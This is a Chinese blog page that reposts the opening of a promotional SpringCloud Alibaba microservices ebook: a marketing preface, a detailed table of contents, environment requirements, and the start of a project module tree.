<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SpringCloud Alibaba 学习圣经，10万字实现 SpringCloud 自由 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SpringCloud Alibaba 学习圣经，10万字实现 SpringCloud 自由" />
<meta property="og:description" content="40岁老架构师尼恩的掏心窝： 现在拿到offer超级难，甚至连面试电话，一个都搞不到。
尼恩的技术社群中（50&#43;），很多小伙伴凭借 “左手云原生&#43;右手大数据 &#43;SpringCloud Alibaba 微服务“三大绝活，拿到了offer，并且是非常优质的offer，据说年终奖都足足18个月 ，非常令人羡慕。
问题是：“左手云原生&#43;右手大数据 &#43;SpringCloud Alibaba 微服务“ 内容非常多，实操的环境非常复杂，底层原理很深。
米饭要一口一口的吃，不能急。在这里，尼恩从架构师视角出发，左手云原生&#43;右手大数据 &#43;SpringCloud Alibaba 微服务 核心原理做一个宏观的介绍。
由于内容确实太多， 所以写多个pdf 电子书：
(1) 《 Docker 学习圣经 》PDF （V1已经完成）
(2) 《 SpringCloud Alibaba 微服务 学习圣经 》PDF （V1已经完成）
(3) 《 K8S 学习圣经 》PDF （coding…）
(4) 《 flink &#43; hbase 学习圣经 》PDF （planning …）
以上学习圣经，并且后续会持续升级，从V1版本一直迭代发布。 就像咱们的《尼恩 Java 面试宝典》一样， 已经迭代到V60啦。
40岁老架构师尼恩的掏心窝： 通过一系列的学习圣经，带大家穿透“左手云原生&#43;右手大数据 &#43;SpringCloud Alibaba 微服务“ ，实现技术 自由 ，走向颠覆人生，让大家不迷路。
本PDF 《SpringCloud Alibaba 微服务 学习圣经》完整版PDF的 V1版本，后面会持续迭代和升级。供后面的小伙伴参考，提升大家的 3高 架构、设计、开发水平。" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/580633b8ca3a3354bcba46544a9fc749/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-15T19:47:47+08:00" />
<meta property="article:modified_time" content="2023-03-15T19:47:47+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SpringCloud Alibaba 学习圣经，10万字实现 SpringCloud 自由</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <h3><a id="40_0"></a>40岁老架构师尼恩的掏心窝：</h3> 
<p>现在<strong>拿到offer超级难</strong>，甚至连面试电话，一个都搞不到。</p> 
<p>尼恩的技术社群中（50+），很多小伙伴凭借 “左手云原生+右手大数据 +SpringCloud Alibaba 微服务“三大绝活，拿到了offer，并且是非常优质的offer，据说<strong>年终奖都足足18个月</strong> ，非常令人羡慕。</p> 
<p>问题是：“左手云原生+右手大数据 +SpringCloud Alibaba 微服务“ <strong>内容非常多，实操的环境非常复杂，底层原理很深</strong>。</p> 
<p><strong>米饭要一口一口的吃，不能急</strong>。在这里，尼恩从架构师视角出发，左手云原生+右手大数据 +SpringCloud Alibaba 微服务 核心原理做一个宏观的介绍。</p> 
<blockquote> 
 <p>由于内容确实太多， 所以写多个pdf 电子书：</p> 
 <p>(1) <strong>《</strong> <a href="https://blog.csdn.net/crazymakercircle/article/details/129482349?spm=1001.2014.3001.5502"><strong>Docker 学习圣经</strong></a> <strong>》PDF</strong> （V1已经完成）</p> 
 <p>(2) <strong>《 SpringCloud Alibaba 微服务 学习圣经 》PDF</strong> （V1已经完成）</p> 
 <p>(3) <strong>《 K8S 学习圣经 》PDF</strong> （coding…）</p> 
 <p>(4) <strong>《 flink + hbase 学习圣经 》PDF</strong> （planning …）</p> 
</blockquote> 
<p>以上学习圣经，并且后续会持续升级，从V1版本一直迭代发布。 就像咱们的《<a href="https://blog.csdn.net/crazymakercircle/article/details/124790425">尼恩 Java 面试宝典</a>》一样， 已经迭代到V60啦。</p> 
<p>40岁老架构师尼恩的掏心窝： 通过一系列的学习圣经，带大家穿透“左手云原生+右手大数据 +SpringCloud Alibaba 微服务“ ，实现技术 自由 ，走向颠覆人生，让大家不迷路。</p> 
<p>本PDF 《SpringCloud Alibaba 微服务 学习圣经》<strong>完整版</strong>PDF的 V1版本，后面会持续迭代和升级。供后面的小伙伴参考，提升大家的 3高 架构、设计、开发水平。</p> 
<p>以上学习圣经的 基础知识是 尼恩的 高并发三部曲，建议在看 学习圣经之前，一定把尼恩的 Java高并发三部曲过一遍，切记，切记。</p> 
<blockquote> 
 <p>注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从这里获取：<a href="https://gitee.com/crazymaker/SimpleCrayIM/blob/master/%E7%96%AF%E7%8B%82%E5%88%9B%E5%AE%A2%E5%9C%88%E6%80%BB%E7%9B%AE%E5%BD%95.md" rel="nofollow">码云</a></p> 
</blockquote> 
<h3><a id="_SpringCloud_Alibaba____PDF__36"></a>《 SpringCloud Alibaba 微服务 学习圣经 》PDF 封面</h3> 
<img src="https://images2.imgbox.com/ae/56/DTOxPIWp_o.png" width="600"> 
<h3><a id="_SpringCloud_Alibaba_____43"></a>《 SpringCloud Alibaba 微服务 学习圣经 》目录</h3> 
<ul><li>40岁老架构师尼恩的掏心窝：</li><li>当前版本V1</li><li>一键导入 SpringCloud 开发环境 （地表最强） 
  <ul><li>环境准备</li><li>一键导入OR自己折腾</li><li>随书源码 crazy-springcloud 脚手架涉以及基础中间件</li></ul> </li><li>微服务 分布式系统的架构12次演进 
  <ul><li>微服务 分布式系统的几个基础概念</li><li>架构演进1：单机架构</li><li>架构演进2：引入缓存架构</li><li>架构演进3：接入层引入反向代理实现负载均衡</li><li>架构演进4：数据库读写分离</li><li>架构演进5：数据库按业务分库</li><li>架构演进6：使用LVS或F5接入层负载均衡</li><li>架构演进7：通过DNS轮询实现机房间的负载均衡</li><li>架构演进8：引入NoSQL数据库和搜索引擎等技术</li><li>架构演进9：大应用拆分为微服务</li><li>架构演进10：引入企业服务总线ESB对微服务进行编排</li><li>架构演进11：引入容器化技术实现动态扩容和缩容</li><li>架构演进12：以云平台承载系统</li><li>架构演进的涉及的核心知识</li></ul> </li><li>SpringCloud netflix 入门 
  <ul><li>SpringCloud 开发脚手架</li><li>启动Eureka Server 注册中心</li><li>启动Config 配置中心 
    <ul><li>config-server 服务</li></ul> </li><li>微服务入门案例</li><li>uaa-provider 微服务提供者 
    <ul><li>uaa-provider 实现一个Rest接口</li><li>uaa-provider的运行结果</li></ul> </li><li>demo-provider 完成RPC远程调用 
    <ul><li>REST服务的本地代理接口</li><li>通过REST服务的本地代理接口，进行RPC调用</li><li>启动demo-provider</li><li>通过swagger 执行RPC操作</li></ul> </li></ul> </li><li>SpringCloud Eureka 服务注册</li><li>SpringCloud Config 统一配置</li><li>Nacos 服务注册+ 统一配置 
  <ul><li>1、Nacos 优势 
    <ul><li>1.1 与eureka对比</li><li>1.2 与springcloud config 对比 
      <ul><li>三大优势：</li></ul> </li></ul> </li><li>2、Spring Cloud Alibaba 套件 
    <ul><li>Spring Cloud Alibaba 套件和Spring Cloud Netflix套件类比</li></ul> </li><li>3、Nacos 的架构和安装 
    <ul><li>3.1 Nacos 的架构</li><li>3.2 Nacos Server 的下载和安装</li></ul> </li><li>4、Nacos Server 的运行 
    <ul><li>4.1两种模式</li><li>4.2 standalone 模式</li><li>4.3 cluster 模式 
      <ul><li>cluster 模式需要依赖 MySQL，然后改两个配置文件：</li></ul> </li><li>4.4 Nacos Server 的配置数据是存在哪里呢？</li></ul> </li><li>5、实战1：使用Nacos作为注册中心 
    <ul><li>实战的工程</li><li>5.1 如何使用Nacos Client组件 
      <ul><li>首先引入 Spring Cloud Alibaba 的 BOM</li></ul> </li><li>5.2 演示的模块结构</li><li>5.3 provider 微服务 
      <ul><li>step1：在 provider 和 consumer 的 pom 添加以下依赖：</li><li>step2：启动类</li><li>step3：服务提供者的 Rest 服务接口</li><li>step4：配置文件</li><li>step5：启动之后，通过swagger UI访问：</li></ul> </li><li>5.4 Consumer 微服务演示RPC远程调用 
      <ul><li>消费者的controller 类</li><li>消费者配置文件</li><li>通过swagger UI访问消费者：</li></ul> </li><li>5.5涉及到的演示地址：</li><li>5.6 Nacos Console</li></ul> </li><li>6、实战2：使用Nacos作为配置中心 
    <ul><li>6.1 基本概念 
      <ul><li>1）Profile</li><li>2）Data ID</li><li>3）Group</li></ul> </li><li>6.2 通过Nacos的console 去增加配置 
      <ul><li>1）nacos-config-demo-dev.yaml</li><li>2）nacos-config-demo-sit.yaml</li></ul> </li><li>6.3 使用Nacos Config Client组件 
      <ul><li>1）加载nacos config 的客户端依赖：</li><li>启动类</li><li>控制类：</li><li>2）bootstrap配置文件</li></ul> </li><li>6.4 测试结果</li><li>6.4 可以端如何与服务端的配置文件相互对应</li></ul> </li><li>7、配置的隔离</li><li>8、nacos集群搭建 
    <ul><li>IP规划</li><li>集群的使用</li></ul> </li></ul> </li><li>Nacos 高可用架构与实操 
  <ul><li>客户端高可用 
    <ul><li>客户端高可用的方式一：配置多个nacos-server</li><li>Nacos Java Client通用参数</li><li>客户端高可用的方式二：本地缓存文件 Failover 机制 
      <ul><li>本地缓存文件 Failover 机制</li><li>客户端Naming通用参数</li></ul> </li></ul> </li><li>Nacos两种健康检查模式 
    <ul><li>agent上报模式</li><li>服务端主动检测</li><li>临时实例 
      <ul><li>注册实例支持ephemeral字段</li><li>临时实例和持久化实例区别</li></ul> </li></ul> </li><li>Nacos Server运行模式 
    <ul><li>Nacos CP/AP模式设定</li><li>Nacos CP/AP模式切换</li></ul> </li><li>AP/CP的配套一致性协议 
    <ul><li>AP模式下的distro 协议</li><li>CP模式下的raft协议</li></ul> </li><li>集群内部的特殊的心跳同步服务</li><li>集群部署模式高可用 
    <ul><li>节点数量</li><li>多可用区部署</li><li>部署模式</li><li>高可用nacos的部署架构</li><li>高可用nacos的部署实操</li></ul> </li><li>总结</li></ul> </li><li>SpringCloud Feign 实现RPC 远程调用</li><li>SpringCloud + Dubbo 实现RPC 远程调用 
  <ul><li>大背景：全链路异步化的大趋势来了</li><li>SpringCloud + Dubbo 完成 RPC 异步</li><li>Dubbo3应用的宏观架构</li><li>Dubbo3 应用架构的核心组件</li><li>SpringBoot整合Dubbo3.0基础准备</li><li>SpringCloud+Nacos+Dubbo3.0 
    <ul><li>版本说明</li><li>项目结构介绍 
      <ul><li>1、dubbo的依赖的坐标</li><li>2、 注册中心的依赖的坐标</li></ul> </li><li>SpringBoot整合Dubbo3.0大致步骤</li><li>模块结构</li><li>Dubbo微服务注册发现的相关配置</li><li>命名空间隔离</li></ul> </li><li>微服务yml配置</li><li>common-service 模块</li><li>服务提供者实操：dubbo-provider 服务 
    <ul><li>pom依赖</li><li>服务实现类</li><li>dubbo和Feign的一个不同</li><li>Provider的Dubbo+Nacos配置文件</li><li>启动类 加上@EnableDubbo 注解</li><li>启动、体验Provider</li><li>在Nacos查看Dubbo服务的注册情况</li></ul> </li><li>服务消费者实操：dubbo-consumer 服务</li><li>consumer模块 
    <ul><li>消费者实现类</li><li>消费者Dubbo+Nacos配置文件</li><li>启动类 加上@EnableDubbo 注解</li><li>启动、体验 Consumer</li><li>在Nacos查看Dubbo服务的注册情况</li></ul> </li><li>Feign+Dubbo性能的对比测试 
    <ul><li>Dubbo比Feign高10倍以上的本质</li><li>Dubbo 与 SpringCloud 的通信 Openfeign的区别 
      <ul><li>1、协议支持方面</li><li>2、通信性能方面</li><li>3、线程模型方面</li></ul> </li></ul> </li><li>SpringCloud + Dubbo RPC 的集成价值</li></ul> </li><li>hystrix 服务保护</li><li>Sentinel 服务保护 
  <ul><li>sentinel 基本概念</li><li>1、什么是Sentinel: 
    <ul><li>Sentinel 具有以下特征：</li><li>Sentinel主要特性：</li><li>Sentinel 的使用</li><li>Sentinel中的管理控制台 
      <ul><li>1 获取 Sentinel 控制台</li><li>2 sentinel服务启动</li></ul> </li><li>客户端能接入控制台</li><li>Sentinel与Hystrix的区别</li></ul> </li><li>2、使用 Sentinel 来进行熔断与限流 
    <ul><li>1）定义资源 
      <ul><li>资源注解@SentinelResource</li><li>@SentinelResource 注解 
        <ul><li>fallback 函数签名和位置要求：</li><li>defaultFallback 函数签名要求：</li></ul> </li></ul> </li><li>2）定义规则</li></ul> </li><li>3、sentinel 熔断降级 
    <ul><li>1）什么是熔断降级</li><li>2）熔断降级规则</li><li>3）几种降级策略</li><li>4）熔断降级代码实现</li><li>5）控制台降级规则</li><li>6）与Hystrix的熔断对比：</li></ul> </li><li>4、Sentinel 流控（限流） 
    <ul><li>基本的参数</li><li>流控的几种 strategy：</li><li>4.1 直接失败模式 
      <ul><li>使用API进行资源定义</li><li>代码限流规则</li><li>网页限流规则配置</li><li>测试</li></ul> </li><li>4.2 关联模式 
      <ul><li>使用注解进行资源定义</li><li>代码配置关联限流规则</li><li>网页限流规则配置</li><li>测试</li></ul> </li><li>4.3 Warm up（预热）模式 
      <ul><li>使用注解定义资源</li><li>代码限流规则</li><li>网页限流规则配置</li><li>通过jmeter进行测试</li></ul> </li><li>4.4 排队等待模式 
      <ul><li>示例</li><li>使用注解定义资源</li><li>代码限流规则</li><li>网页限流规则配置</li><li>通过jmeter进行测试</li></ul> </li><li>4.5 热点规则 (ParamFlowRule) 
      <ul><li>自定义资源</li><li>限流规则代码：</li><li>网页限流规则配置</li></ul> </li></ul> </li><li>5、Sentinel 系统保护 
    <ul><li>系统保护的目的</li><li>系统保护规则的应用</li><li>网页限流规则配置</li></ul> </li><li>6、黑白名单规则 
    <ul><li>访问控制规则 (AuthorityRule)</li></ul> </li><li>7、如何定义资源 
    <ul><li>方式一：主流框架的默认适配</li><li>方式二：抛出异常的方式定义资源</li><li>方式三：返回布尔值方式定义资源</li><li>方式四：注解方式定义资源</li><li>方式五：异步调用支持</li></ul> </li><li>8、核心组件 
    <ul><li>Resource</li><li>Context 
      <ul><li>Context的创建与销毁</li></ul> </li><li>Entry</li><li>DefaultNode</li><li>StatisticNode</li></ul> </li><li>9、插槽Slot 
    <ul><li>NodeSelectorSlot</li><li>调用链树</li><li>构造树干 
      <ul><li>创建context</li><li>创建Entry</li><li>退出Entry</li></ul> </li><li>构造叶子节点 
      <ul><li>保存子节点</li></ul> </li><li>ClusterBuilderSlot</li><li>StatistcSlot</li><li>SystemSlot</li><li>AuthoritySlot</li><li>FlowSlot</li><li>DegradeSlot</li><li>DefaultProcessorSlotChain</li><li>slot总结</li></ul> </li><li>10、sentinel滑动窗口实现原理 
    <ul><li>1）基本原理</li><li>2）sentinel使用滑动窗口都统计啥</li><li>3）滑动窗口源码实现 
      <ul><li>3.1）MetricBucket</li><li>3.2）WindowWrap</li><li>3.3）LeapArray</li></ul> </li></ul> </li></ul> </li><li>Zuul 微服务网关</li><li>Webflux 响应式编程 
  <ul><li>WebFlux 学习前言</li><li>WebFlux 增删改查完整实战 demo 
    <ul><li>Dao层 （又称 repository 层）</li><li>entity（又称 PO对象）</li><li>Dao 实现类</li><li>Service服务层</li><li>Controller控制层</li><li>Mono</li><li>Flux</li></ul> </li><li>使用配置模式进行WebFlux 接口开发</li><li>处理器类 Handler</li><li>路由配置</li><li>WebFlux集成Swagger 
    <ul><li>maven依赖</li><li>swagger 配置</li></ul> </li><li>WebFlux 测试 
    <ul><li>配置模式的 WebFlux Rest接口测试</li><li>注解模式的WebFlux Rest接口测试</li><li>swagger 增加界面</li></ul> </li><li>配置大全 
    <ul><li>静态资源配置</li><li>WebFluxSecurity配置</li><li>WebSession配置</li><li>文件上传配置</li></ul> </li><li>WebFlux 执行流程</li><li>WebFlux学习提示</li></ul> </li><li>Spring Cloud Gateway 微服务网关 
  <ul><li>1、SpringCloud Gateway 简介 
    <ul><li>1.1 本文姊妹篇 《Flux 和 Mono 、reactor实战 （史上最全）》</li><li>1.2 SpringCloud Gateway 特征</li><li>1.3 SpringCloud Gateway和架构 
      <ul><li>1）SpringCloud Zuul的IO模型</li><li>2）Webflux 服务器</li><li>3）Spring Cloud Gateway的处理流程</li></ul> </li></ul> </li><li>2、路由配置方式 
    <ul><li>2.1 基础URI路由配置方式</li><li>2.2 基于代码的路由配置方式</li><li>2.3 和注册中心相结合的路由配置方式</li></ul> </li><li>3、路由 匹配规则 
    <ul><li>说明：</li><li>3.1 Predicate 断言条件(转发规则)介绍 
      <ul><li>1）通过请求参数匹配</li><li>2）通过 Header 属性匹配</li><li>3）通过 Cookie 匹配</li><li>4）通过 Host 匹配</li><li>5）通过请求方式匹配</li><li>6）通过请求路径匹配</li><li>7）通过请求 ip 地址进行匹配</li><li>8）组合使用</li></ul> </li><li>3.2 过滤器规则（Filter） 
      <ul><li>过滤器规则（Filter）</li><li>PrefixPath</li><li>RedirectTo</li><li>RemoveRequestHeader</li></ul> </li><li>RemoveResponseHeader 
      <ul><li>RemoveRequestParameter</li><li>RewritePath</li><li>SetPath</li><li>SetRequestHeader</li><li>SetStatus</li><li>StripPrefix</li><li>RequestSize</li><li>Default-filters</li></ul> </li><li>3.3 通过代码进行配置</li><li>3.2 实现熔断降级</li></ul> </li><li>4、高级配置 
    <ul><li>4.1 分布式限流</li><li>4.2 健康检查配置 
      <ul><li>maven依赖</li><li>配置文件</li></ul> </li><li>4.3 统一配置跨域请求：</li></ul> </li><li>5、整合Nacos 
    <ul><li>maven依赖</li><li>服务发现配置：从Nacos获取微服务提供者清单</li><li>nacos实现动态配置</li><li>服务发现路由predicates和filters的自定义定义</li><li>为注册中心路由配置断言和过滤器</li></ul> </li><li>6、整合Swagger聚合微服务系统API文档 
    <ul><li>maven依赖</li><li>配置文件</li><li>效果：</li></ul> </li><li>7、Gatway 网关的过滤器开发 
    <ul><li>7.1 过滤器的执行次序</li><li>7.2定义全局过滤器</li><li>7.3定义局部过滤器</li></ul> </li><li>8、整合Sentinel完成流控和降级 
    <ul><li>maven依赖</li><li>配置文件</li><li>限流规则通用配置</li><li>限流规则设置</li><li>网关限流参数</li></ul> </li></ul> </li><li>SpringBoot Admin 进行微服务实例的监控 
  <ul><li>使用SpringBoot Admin 进行日志的记录</li><li>1、SpringBoot Admin 简介</li><li>2、使用 SpringBoot Admin 监控服务 
    <ul><li>2.1 导入依赖</li><li>2.2 配置yml</li><li>2.3 集成spring security</li><li>2.4 启动器类</li><li>2.5、测试</li></ul> </li><li>3、actuator 启用和暴露端点 
    <ul><li>3.1 启用端点</li><li>3.2 暴露端点</li></ul> </li><li>4、微服务Provider改造 
    <ul><li>4.1 导入依赖</li><li>4.2 配置yml</li><li>使用context-path</li><li>加上spring security密码</li></ul> </li><li>5、admin实现在线日志查看 
    <ul><li>5.1、添加jar包</li><li>5.2 在application.yml平级文件夹中添加logback-spring.xml配置文件</li><li>5.3 log.path 如何使用环境变量呢？</li><li>5.4 actuator的配置</li></ul> </li><li>测试结果 
    <ul><li>1.不暴露端点 测试</li><li>2.正常情况</li></ul> </li><li>6、admin与Nacos（或Eureka）结合的好处</li></ul> </li><li>ELK日志平台（elasticsearch +logstash+kibana）原理和实操 
  <ul><li>ELK的关系 
    <ul><li>ELK优点</li><li>简单的ELK日志平台</li><li>ELK改进之引入Filebeat</li><li>ELK的应用场景</li><li>ELK的不足 
      <ul><li>es的资源占用</li></ul> </li></ul> </li><li>Elasticsearch概述</li><li>logstash概述 
    <ul><li>logstash作用：</li><li>logstash的架构： 
      <ul><li>Input(输入）：</li><li>Filter(过滤器）</li><li>Output(输出）：</li></ul> </li><li>Logstash的角色与不足</li></ul> </li><li>filebeat介绍 
    <ul><li>filebeat和beats的关系</li><li>Filebeat是如何工作的</li><li>Filebeat下载页面</li><li>Filebeat文件夹结构 
      <ul><li>Filebeat启动命令</li></ul> </li><li>配置inputs 
      <ul><li>Log input</li></ul> </li><li>配置项 
      <ul><li>管理多行消息</li></ul> </li><li>配置Logstash output</li></ul> </li><li>一键安装 es+logstash+ kibana 
    <ul><li>对应的镜像版本</li><li>docker编码文件</li><li>访问kibana</li></ul> </li><li>读取filebeat-输出到es集群</li><li>在kibana显示的效果</li><li>使用filebeat发送日志 
    <ul><li>制作filebeat镜像</li><li>制作基础的unbantu镜像</li><li>推送镜像到dockerhub</li><li>制作filebeat镜像 
      <ul><li>dockerfile</li></ul> </li><li>推送镜像到dockerhub</li></ul> </li><li>example-application微服务的filebeat配置： 
    <ul><li>filebeat.yml的参考配置：</li></ul> </li><li>input.yml配置：</li><li>修改dockerfile</li><li>一键发布</li><li>启动之后</li><li>message-dispatcher微服务的日志 
    <ul><li>查看日志索引</li></ul> </li><li>logstash 详解 
    <ul><li>stash第一个事件 
      <ul><li>Logstash的核心流程的三个环节</li></ul> </li><li>logstash数值类型</li><li>logstash 条件判断</li><li>logstash 比较运算符</li><li>数据输入环节</li><li>stdin</li><li>file</li><li>syslogs</li><li>beats</li><li>kafka</li></ul> </li><li>数据处理环节 
    <ul><li>grok解析文本并构造</li><li>date日期解析</li><li>mutate字段转换</li></ul> </li><li>covert类型转换 
    <ul><li>split</li><li>merge</li><li>rename</li><li>remove_field：移除字段</li><li>join</li><li>geoip</li><li>ruby</li><li>urldecode</li><li>kv</li><li>useragent</li></ul> </li><li>数据输出 
    <ul><li>stdout</li><li>file</li><li>kafka</li><li>elasticseach</li></ul> </li><li>Kibana查看应用日志 
    <ul><li>1 查看应用日志</li><li>2 如何搜索日志</li><li>3 如何查看指定时间的应用日志</li><li>4 如何定位错误日志</li><li>5 如何展开显示日志</li></ul> </li><li>es的安全认证</li><li>配置 elk的ElastAlert 预警插件</li></ul> </li><li>Prometheus+Grafana 检测预警 
  <ul><li>什么是性能可观测 
    <ul><li>系统监控的核心指标 
      <ul><li>系统性能指标</li><li>资源性能指标</li></ul> </li></ul> </li><li>什么是prometheus 
    <ul><li>prometheus的运行原理</li><li>prometheus主要特点</li></ul> </li><li>什么是 Grafana</li><li>Prometheus的体系结构</li><li>Prometheus+Grafana分层架构 
    <ul><li>Promcthcus体系涉及的组件</li><li>如何收集度量值</li></ul> </li><li>指标类型 
    <ul><li>计数器</li><li>仪表盘</li><li>直方图</li><li>Summary</li></ul> </li><li>指标摘要及聚合 
    <ul><li>指标摘要</li><li>指标聚合</li></ul> </li><li>一键安装 prometheus 
    <ul><li>bridge网络管理</li><li>创建库</li><li>docker编排文件</li><li>一键安装 prometheus的脚本</li><li>进入 prometheus</li><li>进入 grafana</li></ul> </li><li>Prometheus+Grafana监控SpringBoot项目JVM信息 
    <ul><li>SpringBoot项目配置JVM采集</li><li>Prometheus配置</li></ul> </li><li>配置grafana监控Linux系统 
    <ul><li>使用 Exporter 收集指标</li><li>inux直接安装node_exporter</li><li>使用Docker容器安装node_exporter</li><li>创建一个任务定时扫描暴露的指标信息</li><li>创建仪表盘grafna</li><li>导入Dashboard</li></ul> </li><li>选择数据源为Prometheus</li><li>配置grafana监控SpringBoot应用 
    <ul><li>主要步骤</li><li>找jvm的 dashboard</li><li>JVM Quarkus 面板</li></ul> </li><li>Prometheus数据模型 
    <ul><li>time-series 时间序列值</li><li>Sample样本值</li><li>metrics name指标名称</li><li>label标签</li><li>Notation(符号)</li><li>TSDB时序数据库</li></ul> </li><li>度量指标类型 
    <ul><li>Counter(计数器)类型</li><li>Gauge(计量器、测量器)</li><li>Histogram(柱状图、直方图)</li><li>Summary</li><li>Summary 和 Histogram 的区分</li></ul> </li><li>学习 PromQL 
    <ul><li>数据模型</li><li>PromQL 入门</li><li>HTTP API</li></ul> </li><li>告警和通知 
    <ul><li>配置告警规则</li><li>使用 Alertmanager 发送告警通知</li></ul> </li><li>服务发现 
    <ul><li>为什么需要服务发现</li><li>prometheus目前支持的服务发现类型</li></ul> </li><li>基于文件的服务发现方式 
    <ul><li>file_sd_configs</li></ul> </li><li>基于consul 的服务发现 
    <ul><li>什么是基于consul的服务发现</li><li>Prometheus配置</li></ul> </li><li>基于eureka的服务发现 
    <ul><li>eureka 客户端暴露出 prometheus 端口</li><li>prometheus配置文件</li></ul> </li><li>基于nacos的服务发现 
    <ul><li>docker 编排文件</li><li>生产的配置文件</li><li>修改prometheus配置文件</li><li>修改springboot项目配置文件</li></ul> </li></ul> </li><li>全方位 Springcloud 性能调优 
  <ul><li>Servlet 容器 优化</li><li>Zuul配置 优化</li><li>Feign 配置优化</li><li>hystrix配置 优化</li><li>ribbon 优化</li></ul> </li><li>高质量实操：SpringCloud 高并发实战案例 
  <ul><li>1、超高并发10Wqps秒杀实操</li><li>2、超高并发100Wqps车联网实操</li><li>3、N多其他的超高并发实操项目</li></ul> </li><li>技术自由的实现路径： 
  <ul><li>实现你的 架构自由：</li><li>实现你的 响应式 自由：</li><li>实现你的 spring cloud 自由：</li><li>实现你的 linux 自由：</li><li>实现你的 网络 自由：</li><li>实现你的 分布式锁 自由：</li><li>实现你的 王者组件 自由：</li><li>实现你的 面试题 自由：</li></ul> </li><li>参考文献</li></ul> 
<h3><a id="V1_607"></a>当前版本V1</h3> 
<p>此书会持续迭代，最新版本，请关注公众号：技术自由圈</p> 
<h3><a id="_SpringCloud____613"></a>一键导入 SpringCloud 开发环境 （地表最强）</h3> 
<p><em>SpringCloud + docker 学习环境非常复杂，尼恩搞这个 前前后后起码 <strong>折腾了一周 ,应该还不止</strong>，</em></p> 
<p><em>其中，很多头疼的工作，包括linux内核升级、磁盘扩容等等， 苦不堪言。</em></p> 
<p>现在把这个环境，以虚拟机box镜像的方式，导出来直接给大家，</p> 
<p>大家一键导入后，直接享受SpringCloud + docker 的实操，可以说，爽到不要不要的。</p> 
<p><em>以上软件和 尼恩个人的虚拟机box镜像，可以找尼恩获取。</em></p> 
<h4><a id="_625"></a>环境准备</h4> 
<p>硬件总体要求，可以参考尼恩的本地硬件情况：</p> 
<p><strong>1 硬件要求。</strong></p> 
<p>本文硬件总体要求如下表：</p> 
<table><thead><tr><th>序号</th><th>硬件</th><th>要求</th></tr></thead><tbody><tr><td>1</td><td>CPU</td><td>至少2核</td></tr><tr><td>2</td><td>内存</td><td>至少16G</td></tr><tr><td>3</td><td>硬盘</td><td>至少100G磁盘空间</td></tr></tbody></table> 
<p><strong>2 本地虚拟机环境</strong></p> 
<table><thead><tr><th>软件</th><th>版本</th></tr></thead><tbody><tr><td>Win</td><td>win10以上</td></tr><tr><td>virtual box</td><td>6以上</td></tr><tr><td>vagrant</td><td>2以上</td></tr></tbody></table> 
<h4><a id="OR_653"></a>一键导入OR自己折腾</h4> 
<p>大家一键导入尼恩的虚拟机环境，里边zookeeper、nacos、docker、k8s等组件都已经预装，直接享受SpringCloud + docker 的实操，可以说，爽到不要不要的。</p> 
<p>当然，如果想<strong>自己折腾</strong>， 也可以按照的步骤来哈。</p> 
<table><thead><tr><th>工欲善其事 必先利其器</th></tr></thead><tbody><tr><td>地表最强 开发环境： <a href="https://www.cnblogs.com/crazymakercircle/p/14194688.html" rel="nofollow">vagrant+java+springcloud+redis+zookeeper镜像下载(&amp;制作详解)</a></td></tr><tr><td>地表最强 热部署：<a href="https://www.cnblogs.com/crazymakercircle/p/12077373.html" rel="nofollow">java SpringBoot SpringCloud 热部署 热加载 热调试</a></td></tr><tr><td>地表最强 发请求工具（再见吧， PostMan ）：<a href="https://www.cnblogs.com/crazymakercircle/p/14317222.html" rel="nofollow">IDEA HTTP Client（史上最全）</a></td></tr><tr><td>地表最强 PPT 小工具： <a href="https://www.cnblogs.com/crazymakercircle/p/14326975.html" rel="nofollow">屌炸天，像写代码一样写PPT</a></td></tr><tr><td><a href="https://www.cnblogs.com/crazymakercircle/p/9904544.html" rel="nofollow"> 无编程不创客，无编程不创客，一大波编程高手正在疯狂创客圈交流、学习中! 找组织，GO</a></td></tr></tbody></table> 
<hr> 
<blockquote> 
 <p>注：本文以 PDF 持续更新，最新尼恩 架构笔记、面试题 的PDF文件，请从下面的链接获取：<a href="https://www.yuque.com/crazymakercircle/gkkw8s/khigna" rel="nofollow">语雀</a> 或者 <a href="https://gitee.com/crazymaker/SimpleCrayIM/blob/master/%E7%96%AF%E7%8B%82%E5%88%9B%E5%AE%A2%E5%9C%88%E6%80%BB%E7%9B%AE%E5%BD%95.md" rel="nofollow">码云</a></p> 
</blockquote> 
<h4><a id="_crazyspringcloud__679"></a>随书源码 crazy-springcloud 脚手架涉以及基础中间件</h4> 
<p>本PDF的随书源码仓库，就是尼恩的 《<strong><a href="https://www.cnblogs.com/crazymakercircle/p/13878143.html" rel="nofollow">Java 高并发核心编程 卷3 加强版，老版本为 SpringCloud Nginx 高并发核心编程</a></strong>》一书的源码</p> 
<p>也是尼恩的一个微服务开发脚手架 crazy-springcloud，其大致的模块和功能具体如下：</p> 
<pre><code>crazymaker-server     --  根项目
│  ├─cloud-center     --  微服务的基础设施中心
│  │  ├─cloud-eureka      --  注册中心
│  │  ├─cloud-config      --  配置中心
│  │  ├─cloud-zuul        --  网关服务
